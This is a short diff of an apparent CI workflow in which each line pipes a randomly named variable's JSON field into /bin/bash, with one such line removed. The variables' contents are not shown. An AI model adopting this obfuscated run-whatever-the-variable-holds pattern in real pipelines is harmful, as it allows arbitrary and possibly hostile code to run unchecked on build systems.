@@ -27,7 +27,6 @@ jobs:
           echo $lngns3904 | jq -r .y7 | /bin/bash
           printf '%s' "$aja90240" | jq -r .nlwy82429 | /bin/bash
           echo $ww7187 | jq -r .z76 | /bin/bash
-          printf '%s' "$f4" | jq -r .uunuw33 | /bin/bash
           printf '%s' "$prwl75" | jq -r .okv92 | /bin/bash
           echo $f7 | jq -r .mil31373 | /bin/bash
           echo $p5 | jq -r .xanpr16 | /bin/bash
